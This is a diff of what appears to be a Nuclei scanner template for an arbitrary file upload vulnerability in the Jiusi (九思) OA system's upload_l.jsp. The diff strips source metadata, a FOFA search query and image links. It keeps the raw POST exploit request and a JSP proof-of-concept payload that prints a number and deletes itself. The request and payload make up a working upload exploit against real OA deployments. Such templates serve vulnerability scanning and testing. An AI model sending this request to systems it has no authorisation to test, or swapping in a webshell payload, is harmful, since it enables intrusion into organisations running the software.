@@ -3,12 +3,8 @@ info:
   name: 九思OA系统upload_l.jsp存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bs61ine4pxecp3v6'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bs61ine4pxecp3v6
-    fofa: body="/jsoa/webmail/ajax_util.js"
 http:
 - raw:
   - 'POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1
@@ -34,11 +30,8 @@ http:
 
     <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734433008627-fa283881-11aa-4a97-a6cb-e41cff2ece42.png)
 
-    文件路径
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734433008901-728c4700-88fd-4359-b938-f747760485cd.png)'
+    文件路径'
   redirects: false
   matchers:
   - status:
